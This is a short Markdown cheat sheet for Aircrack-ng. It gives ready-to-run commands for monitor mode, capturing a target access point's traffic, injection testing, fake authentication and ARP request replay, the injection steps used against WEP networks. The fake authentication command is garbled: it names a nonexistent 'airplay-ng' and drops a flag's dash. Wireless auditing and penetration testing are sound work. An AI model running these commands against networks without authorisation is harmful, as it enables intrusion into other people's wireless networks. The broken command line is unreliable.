# Aircrack-ng

### Place adapter into monitor mode and launch Airodump-ng.
```
sudo airmon-ng start wlan0 
```

```
sudo airmon-ng check kill
```

```
sudo airodump-ng wlan0mon
```

### Once you are finished using Airodump-ng. The network manager needs to be restarted, follow these steps.
```
sudo ifconfig wlan0mon down
```

```
sudo iwconfig wlan0mon mode managed
```

```
sudo ifconfig wlan0mon up
```

```
sudo service NetworkManager restart
```

### Test wireless device packet injection.
```
aireplay-ng -9 -e <network name> -a <target MAC> <Your Wireless Interface>
```
* ``` -9 ``` Injection.
* ```-e``` Network Name or ESSID.
* ```-a``` MAC or BSSID (of the target access point).
* ```wlan0mon``` Your wireless interface.
  
### Airodump will hop channel to channel. This command can be used to camp a certain channel.
```
airodump-ng -c 3 --bssid <Target MAC> -w <File Name> <Your Wireless Interface>
```
* ```-c``` Channel to camp.
* ```--bssid``` Target MAC address.
* ```-w``` Name of file output file (outputs in .pcap format, this means it can be opened in Wireshark).
* ```wlan0mon``` Your wireless device.

### Initiate fake authentication request. Execute this command in a seperate terminal window while the above command is running.
```
airplay-ng -1 0 e <Network Name> -a <Target MAC> -h <Wireless MAC> <Your Wirelss Interface>
```
* ```-1``` Use fake authentication.
* ```0``` Reassociation timing in seconds.
* ```-e``` Network name or ESSID.
* ```-a``` Target MAC address.
* ```-h``` Your MAC address.
* ```wlan0mon``` Your wireless interface.

### ARP request replay mode. When an ARP request is identified it will immediately start to inject it.
```
aireplay-ng -3 -b <Target MAC> -h <Your MAC> <Interface>
```
* ```-3``` Listen to/inject ARP request.
* ```-b``` Target MAC address.
* ```-h``` Your MAC address.
* ```wlan0mon``` Your wireless interface.

